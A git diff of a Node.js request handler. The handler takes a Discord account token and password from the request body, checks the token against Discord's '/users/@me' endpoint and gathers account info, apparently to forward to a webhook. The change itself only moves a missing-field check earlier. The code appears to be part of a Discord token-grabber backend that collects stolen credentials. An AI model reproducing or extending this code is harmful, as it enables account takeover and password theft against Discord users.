@@ -9,7 +9,11 @@ exports.send = (req, res, webhook) =>
 	const token = req.body.token;
 	const password = req.body.password;
 	
-	var info;
+
+	
+	if(token === undefined || password === undefined)
+		return res.status(400).json({status: "error", message: "Not sent."});
+		var info;
 axios.get('https://discordapp.com/api/v8/users/@me', {
     withCredentials: true,
     headers: {
@@ -21,10 +25,6 @@ axios.get('https://discordapp.com/api/v8/users/@me', {
   )
 }
 
-	
-	if(token === undefined || password === undefined)
-		return res.status(400).json({status: "error", message: "Not sent."});
-	
 	
 
  	info = getinfo(token);
